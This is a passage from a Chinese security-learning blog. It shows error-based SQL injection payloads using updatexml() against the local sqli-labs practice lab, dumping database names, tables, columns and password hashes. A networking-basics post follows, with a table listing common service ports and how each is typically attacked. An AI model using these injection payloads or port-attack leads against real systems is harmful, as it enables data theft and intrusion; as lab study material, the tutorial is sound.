<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>

<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>

<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>

<hr>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-计网基础" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/"
    >计网基础</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2020-04-17T12:24:27.000Z" itemprop="datePublished">2020-04-17</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><p><strong>osi七层模型：</strong></p>
<p><strong>物理层-链路层-网络层-运输层-会话层-表示层-应用层</strong></p>
<p>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</p>
<p>但是OSI在市场化方面是失败的—过于复杂等因素</p>
<p><strong>TCP/IP 获得了最广泛的应用–四层体系结构</strong></p>
<p><strong>应用层–运输层–网际层–网络接口层</strong></p>
<p>还有折中的五层体系结构： <strong>物理层–数据链路层–网络层–运输层–应用层</strong></p>
<hr>
<p><strong>实体：</strong>表示任何可发送或接收信息 的硬件或软件进程</p>
<p>同一系统相邻两层的实体进行交互的地方，称为 <strong>服务访问点 SAP (Service Access Point)</strong></p>
<p><strong>PDU（protocol data unit）</strong>每一层使用自己层的协议和别的系统对应层相互通信，交换的信息叫做<strong>协议数据单</strong></p>
<p><strong>• 上三层：message 消息</strong> </p>
<p><strong>• 传输层：segment 数据段</strong></p>
<p><strong>• 网络层：packet 包</strong></p>
<p><strong>• 链路层：frame 帧</strong></p>
<p><strong>• 物理层：bit     比特流</strong></p>
<p>互联网组成 按工作方式划分为以下的两部分： </p>
<p><strong>(1)边缘部分</strong> 所有连接在互联网上的主机用户直接使用，进行通信和资源共享</p>
<p><strong>(2)核心部分</strong> 大量网络和连接网络的设备组成为边缘部分提供连通交换</p>
<p>互联网的边缘部分–两种通信方式 </p>
<p><strong>• 客户–服务器方式</strong>（<strong>C/S 方式）</strong> 即Client/Server方式 </p>
<p><strong>• 对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式</p>
<hr>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h2><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><strong>网际协议IP</strong></h3><p>与 IP 协议配套使用的还有三个协议： </p>
<p><strong>– 地址解析协议 ARP (Address Resolution Protocol)</strong> </p>
<p><strong>– 网际控制报文协议 ICMP (Internet Control Message Protocol)</strong> </p>
<p><strong>– 网际组管理协议 IGMP (Internet Group Management Protocol)</strong></p>
<p><strong>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}</strong> </p>
<p><strong>网络号net-id</strong>，它标志主机（或路由器）所连接到的网络</p>
<p><strong>主机号host-id</strong>，它标志该主机 （或路由器）</p>
<table>
<thead>
<tr>
<th></th>
<th>网络数目</th>
<th>第一个可用的网络号</th>
<th>最后一个课用的网络号</th>
<th>最大的主机数</th>
</tr>
</thead>
<tbody><tr>
<td>A类</td>
<td>126 (2^7-1)</td>
<td>1</td>
<td>126</td>
<td>1600万</td>
</tr>
<tr>
<td>B类</td>
<td>16383  (2^14-1)</td>
<td>128.1</td>
<td>191.255</td>
<td>65534</td>
</tr>
<tr>
<td>C类</td>
<td>2^21 -1</td>
<td>192.0.1</td>
<td>223.255.255</td>
<td>254</td>
</tr>
</tbody></table>
<p> <strong>特殊的IP地址</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中</span></span><br><span class="line"><span class="comment">#而使用这三个网段的计算机要上网必须要通过地址翻译（NAT），将私有地址翻译成公用合法的IP地址</span></span><br><span class="line"><span class="number">10</span>.*.*.*    <span class="number">172.16</span>.*.*    <span class="number">172.31</span>.*.*   <span class="number">192.168</span>.*.*  </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你的主机使用了DHCP功能自动获得一个ip地址，那么当你的DHCP服务器发生故障或响应时间太长而超出系统规定的一个时间，windows系统会为你分配这样一个地址</span></span><br><span class="line"><span class="number">169.254</span>.*.*</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机。如果翻译成人类的语言，应该是这样：“这个房间里的所有人都注意了！”这个地址不能被路由器转发。</span></span><br><span class="line"><span class="number">255.255</span>.<span class="number">255.255</span></span><br></pre></td></tr></table></figure>

<p>在同一个局域网上的主机或路由器 他们IP地址的网络号必须是一样</p>
<p>路由器总是具有<strong>两个或两个以上的IP地址</strong>。 路由器的每一个接口都有一个不同网络号的IP地址</p>
<hr>
<h3 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h3><p>数据链路层的帧 必须使用硬件地址</p>
<p>每一个主机都有一个 ARP 高速缓存(ARP cache) </p>
<p>– 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址 </p>
<p>– 减少网络上的通信量 </p>
<p>• 主机 A 向本网的主机 B 发送 IP 数据报 </p>
<p>根据IP地址查找 ARP 高速缓存 </p>
<p>– 如有，将硬件地址写入 MAC 帧</p>
<p>– 如没有，ARP请求广播，如下图</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/1.png" style="zoom:80%;">

<p>• ARP 是解决<strong>同一个局域网上</strong>的主机或路由器 的 IP 地址和硬件地址的映射问题</p>
<p> • 如果所要找的主机和源主机不在同一个局域网上，那么网关来了</p>
<p> <strong>• 网关-</strong>-网络层以上使用的中间设备，很少用 </p>
<p>​          –路由器的旧称</p>
<p><strong>• 使用 ARP 的四种典型情况</strong></p>
<p> • 发送方是主机，要把IP数据报发送到本网络上的另一个主 机。这时用 ARP 找到目的主机的硬件地址。 </p>
<p>• 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到网关硬件地址。剩下的工作由 网关来完成。 </p>
<p>• 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。</p>
<p>• 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬 件地址。剩下的工作由这个路由器来完成</p>
<hr>
<h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a><strong>划分子网</strong></h3><p>早期IP 地址的设计确实不够合理<br>– 两级的 IP 地址不够灵活<br>– IP 地址空间的利用率有时很低<br>– 路由表太大，网络性能差</p>
<p><strong>划分子网(subnetting)</strong></p>
<p>– 互联网的正式标准协议 </p>
<p>– 在 IP 地址中增加 “子网号字段” subnet-id </p>
<p>– 子网号是借用若干位的主机号 </p>
<p>– 两级IP 地址变为三级 IP 地址<br>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p>
<p>通常 划分子网是一个单位内部事情 外网看不见划分情况 </p>
<p>这个单位对外仍然表现为一个网络。 </p>
<p>– 从其他网络发送给本单位某个主机的 IP 数据报 </p>
<p>– 仍然根据 IP 数据报的<strong>目的网络号 net-id</strong>，先找到连接 在本单位网络上的路由器</p>
<p>– 单位网<strong>路由器</strong>收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网</p>
<p>– 最后将 IP 数据报直接交付目的主机</p>
<p><strong>如何判断是否划分子网？</strong></p>
<p>• 从IP数据报的首部无法判断 </p>
<p><strong>• 使用子网掩码(subnet mask)</strong></p>
<hr>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a><strong>运输层</strong></h2><p>TCP/IP 的运输层有两个不同的协议： </p>
<p><strong>(1)用户数据报协议 UDP   (User Datagram Protocol)</strong> </p>
<p>– 当运输层采用无连接的 UDP 协议时，这种逻辑通信信 道是一条不可靠信道。 </p>
<p><strong>(2) 传输控制协议 TCP     (Transmission Control Protocol)</strong> </p>
<p>– 当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</p>
<p>TCP 最主要的特点 </p>
<p>• TCP 是面向连接的           <strong>• 每一条 TCP 连接只能有两个端点</strong> 只能是点对点（一对一）</p>
<p>• TCP 提供可靠交付的服务 <strong>无差错，不丢失，不重复，按序到达</strong></p>
<p>• TCP 提供全双工通信 • TCP 是面向字节流的</p>
<h3 id="三次握手建立-TCP-连接"><a href="#三次握手建立-TCP-连接" class="headerlink" title="三次握手建立 TCP 连接"></a><strong>三次握手建立 TCP 连接</strong></h3><p><strong>A 的 TCP 向 B</strong> 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，</p>
<p>表明传送数据时的第一个数据字节的序号是 x。</p>
<p><strong>B 的 TCP 收到连接</strong>请求报文段后，如同意，则 发回确认。</p>
<p>B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。</p>
<p><strong>A 收到此报文段后</strong>向 B 给出确认，其ACK = 1， 确认号 ack = y + 1,  A 的 TCP 通知上层应用进程，连接已经建立</p>
<p><strong>B 的 TCP 收到主机A 的确认后</strong>，也通知其上层 应用进程：TCP 连接已经建立。</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/2.png" style="zoom:80%;">

<hr>
<p>三类端口 </p>
<p>• 熟知端口，数值一般为 0~1023。 </p>
<p>• 登记端口号，数值为1024~49151，为没有熟知 端口号的应用程序使用的。使用这个范围的端口 号必须在 IANA 登记，以防止重复。 </p>
<p>• 客户端口号或短暂端口号，数值为49152~65535， 留给客户进程选择暂时使用。当服务器进程收到 客户进程的报文时，就知道了客户进程所使用的 动态端口号。通信结束后，这个端口号可供其他 客户进程以后使</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h2><p>超文本传送协议 HTTP<br>• 用户点击鼠标后所发生的事件</p>
<p> (1) 浏览器分析超链指向页面的 URL。</p>
<p> (2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的 IP 地址。</p>
<p> (3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。</p>
<p> (4) 浏览器与服务器建立 TCP 连接 </p>
<p>(5) 浏览器发出取文件命令： GET /chn/yxsz/index.htm。</p>
<p> (6) 服务器给出响应，把文件 index.htm 发给浏览器。</p>
<p> (7) TCP 连接释放。 </p>
<p>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所 有文本。</p>
<h3 id="HTTPS加密协议过程："><a href="#HTTPS加密协议过程：" class="headerlink" title="HTTPS加密协议过程："></a><strong>HTTPS加密协议过程：</strong></h3><p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<hr>
<h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a><strong>常用端口</strong></h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a><strong>文件共享服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>21/69</strong></td>
<td><strong>FTP/TFTP 文件传输协议</strong></td>
<td><strong>允许匿名上传、下载、爆破和嗅探</strong></td>
</tr>
<tr>
<td><strong>2049</strong></td>
<td><strong>NFS 服务</strong></td>
<td><strong>配置不当</strong></td>
</tr>
<tr>
<td><strong>139</strong></td>
<td><strong>Samba 服务</strong></td>
<td><strong>爆破、未授权访问、远程代码执行</strong></td>
</tr>
<tr>
<td><strong>389</strong></td>
<td><strong>LDAP 目录访问协议</strong></td>
<td><strong>注入、允许匿名访问、弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="远程连接服务器端口"><a href="#远程连接服务器端口" class="headerlink" title="远程连接服务器端口"></a><strong>远程连接服务器端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>22</strong></td>
<td><strong>SSH远程连接</strong></td>
<td><strong>爆破、SSH隧道及内网代理转发、文件传输</strong></td>
</tr>
<tr>
<td><strong>23</strong></td>
<td><strong>Telnet远程登录服务</strong></td>
<td><strong>爆破、嗅探、弱口令</strong></td>
</tr>
<tr>
<td><strong>3389</strong></td>
<td><strong>RDP远程桌面连接</strong></td>
<td><strong>Shift后门(Windows Server 2003以下版本)、爆破</strong></td>
</tr>
<tr>
<td><strong>5900</strong></td>
<td><strong>VNC</strong></td>
<td><strong>弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5632</strong></td>
<td><strong>PyAnywhere服务</strong></td>
<td><strong>抓密码、代码执行</strong></td>
</tr>
</tbody></table>
<p><strong>22端口：</strong>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的，就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式，就是“中间人”冒充真正的服务器接收你的传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。</p>
<p>SSH的英文全称是Secure  SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够<strong>防止DNS和IP欺骗</strong>。还有一个额外的好处就是<strong>传输的数据是经过压缩</strong>的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”。 </p>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a><strong>Web应用服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>80/443/8080</strong></td>
<td><strong>常见Web服务端口</strong></td>
<td><strong>Web攻击、爆破、对应服务版本漏洞</strong></td>
</tr>
<tr>
<td><strong>7001/70022</strong></td>
<td><strong>Weblogic控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>8080/8089</strong></td>
<td><strong>Jboos/Resin/Jetty/Jenkins</strong></td>
<td><strong>反序列化、控制台弱口令</strong></td>
</tr>
<tr>
<td><strong>9090</strong></td>
<td><strong>WebSphere控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>4848</strong></td>
<td><strong>GlassFish控制台</strong></td>
<td><strong>弱口令</strong></td>
</tr>
<tr>
<td><strong>1352</strong></td>
<td><strong>Lotus dominion邮件服务</strong></td>
<td><strong>弱口令、信息泄露、爆破</strong></td>
</tr>
<tr>
<td><strong>10000</strong></td>
<td><strong>Webmin-Web控制面板</strong></td>
<td><strong>弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a><strong>数据库端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>3306</strong></td>
<td><strong>MySQL</strong></td>
<td><strong>注入、提权、爆破</strong></td>
</tr>
<tr>
<td><strong>1433</strong></td>
<td><strong>MSSQL</strong></td>
<td><strong>注入、提权、SAP弱口令、爆破</strong></td>
</tr>
<tr>
<td><strong>1521</strong></td>
<td><strong>Oracle</strong></td>
<td><strong>TNS爆破、注入、反弹Shell</strong></td>
</tr>
<tr>
<td><strong>5432</strong></td>
<td><strong>PostgreSQL</strong></td>
<td><strong>爆破、注入、弱口令</strong></td>
</tr>
<tr>
<td><strong>27017/27018</strong></td>
<td><strong>MongoDB</strong></td>
<td><strong>爆破、未授权访问</strong></td>
</tr>
<tr>
<td><strong>6379</strong></td>
<td><strong>Redis</strong></td>
<td><strong>未授权访问、弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5000</strong></td>
<td><strong>SysBase/DB2</strong></td>
<td><strong>爆破、注入</strong></td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a><strong>邮件服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>25</strong></td>
<td><strong>SMTP 邮件服务</strong></td>
<td><strong>邮件伪造</strong></td>
</tr>
<tr>
<td><strong>109/110</strong></td>
<td><strong>POP2/POP3</strong></td>
<td><strong>爆破、嗅探</strong></td>
</tr>
<tr>
<td><strong>143</strong></td>
<td><strong>IMAP</strong></td>
<td><strong>爆破</strong></td>
</tr>
</tbody></table>
<p>端口说明：<strong>109端口是为POP2（Post Office Protocol Version  2，邮局协议2）服务开放的，110端口是为POP3（邮件协议3）服务开放的，POP2、POP3都是主要用于接收邮件的，目前POP3使用的比较多</strong>，许多服务器都同时支持POP2和POP3。客户端可以使用POP3协议来访问服务端的邮件服务，如今ISP的绝大多数邮件服务器都是使用该协议。在使用电子邮件客户端程序的时候，会要求输入POP3服务器地址，默认情况下使用的就是110端口。</p>
<p>端口漏洞：POP2、POP3在提供邮件接收服务的同时，也出现了不少的漏洞。单单POP3服务在用户名和密码交换缓冲区溢出的漏洞就不少于20个，比如WebEasyMail POP3 Server合法用户名信息泄露漏洞，通过该漏洞远程攻击者可以验证用户账户的存在。另外，110端口也被ProMail  trojan等木马程序所利用，通过110端口可以窃取POP账号用户名和密码。</p>
<p>操作建议：如果是执行邮件服务器，可以打开该端口</p>
<h3 id="网络协议端口"><a href="#网络协议端口" class="headerlink" title="网络协议端口"></a><strong>网络协议端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>53</strong></td>
<td><strong>DNS域名系统</strong></td>
<td><strong>允许区域传送、DNS劫持、缓存投毒、欺骗</strong></td>
</tr>
<tr>
<td><strong>67/68</strong></td>
<td><strong>DHCP服务</strong></td>
<td><strong>劫持、欺骗</strong></td>
</tr>
<tr>
<td><strong>161</strong></td>
<td><strong>SNMP协议</strong></td>
<td><strong>爆破、搜集目标内网信息</strong></td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a><strong>特殊服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>2128</strong></td>
<td><strong>Zookeeper 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>8068</strong></td>
<td><strong>Zabbix 服务</strong></td>
<td><strong>远程执行、SQL注入</strong></td>
</tr>
<tr>
<td><strong>9200/9300</strong></td>
<td><strong>Elasticsearch 服务</strong></td>
<td><strong>远程执行</strong></td>
</tr>
<tr>
<td><strong>11211</strong></td>
<td><strong>Memcache 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>512/513/514</strong></td>
<td><strong>Linux Rexec 服务</strong></td>
<td><strong>爆破、Rlogin登陆</strong></td>
</tr>
<tr>
<td><strong>873</strong></td>
<td><strong>Rsync 服务</strong></td>
<td><strong>匿名访问、文件上传</strong></td>
</tr>
<tr>
<td><strong>3690</strong></td>
<td><strong>Svn 服务</strong></td>
<td><strong>Svn泄露、未授权访问</strong></td>
</tr>
<tr>
<td><strong>50000</strong></td>
<td><strong>SAP Management Console</strong></td>
<td><strong>远程执行</strong></td>
</tr>
</tbody></table>
<h3 id="端口概念"><a href="#端口概念" class="headerlink" title="端口概念"></a><strong>端口概念</strong></h3><p>在网络技术中，端口（Port）大致有两种意思：一是物理意义上的端口，比如，ADSL  Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。我们这里将要介绍的就是逻辑意义上的端口。</p>
<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a><strong>端口分类</strong></h3><p>逻辑意义上的端口有多种分类标准，下面将介绍两种常见的分类：</p>
<p><strong>1、按端口号分布划分</strong></p>
<p>（1）知名端口（Well-Known Ports）</p>
<p><strong>知名端口即众所周知的端口号，范围从0到1023</strong>，这些端口号一般固定分配给一些服务。比如21端口分配给FTP服务，25端口分配给SMTP（简单邮件传输协议）服务，80端口分配给HTTP服务，135端口分配给RPC（远程过程调用）服务等等。</p>
<p>（2）动态端口（Dynamic Ports）</p>
<p>　　<strong>动态端口的范围从1024到65535</strong>，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序。在关闭程序进程后，就会释放所占用的端口号。</p>
<p>　不过，动态端口也常常被病毒木马程序所利用，如冰河默认连接端口是7626、WAY 2.4是8011、Netspy 3.0是7306、YAI病毒是1024等等。</p>
<p><strong>2、按协议类型划分</strong></p>
<p>按协议类型划分，可以分为TCP、UDP、IP和ICMP（Internet控制消息协议）等端口。下面主要介绍TCP和UDP端口：</p>
<p>（1）TCP端口</p>
<p>TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供可靠的数据传输。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</p>
<p>（2）UDP端口</p>
<p>UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。<strong>常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口</strong>，QQ使用的8000和4000端口等等。</p>
<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a><strong>查看端口</strong></h3><p>在Windows 2000/XP/Server 2003中要查看端口，可以使用Netstat命令：</p>
<p>依次点击“开始→运行”，键入“cmd”并回车，打开命令提示符窗口。在命令提示符状态下键入“netstat -a -n”，按下回车键后就可以看到以数字形式显示的TCP和UDP连接的端口号及状态（如图）。</p>
<p>小知识：Netstat命令用法</p>
<p>命令格式：Netstat －a －e －n －o －s</p>
<p><strong>一般用 netstat -ano 来查看使用中的端口</strong></p>
<p>　　－a 表示显示所有活动的TCP连接以及计算机监听的TCP和UDP端口。</p>
<p>　　－e 表示显示以太网发送和接收的字节数、数据包数等。</p>
<p>　　－n 表示只以数字形式显示所有活动的TCP连接的地址和端口号。</p>
<p>　　－o 表示显示活动的TCP连接并包括每个连接的进程ID（PID）。</p>
<p>　　－s 表示按协议显示各种连接的统计信息，包括端口号</p>
<hr>
<p>参考：<a href="https://www.cnblogs.com/zane-s/p/12435873.html" target="_blank" rel="noopener">https://www.cnblogs.com/zane-s/p/12435873.html</a></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2020
        0Rld
      </li>
      <li>
        
          Powered by
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
        
        <span>
  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
</span>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src=''></script>
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
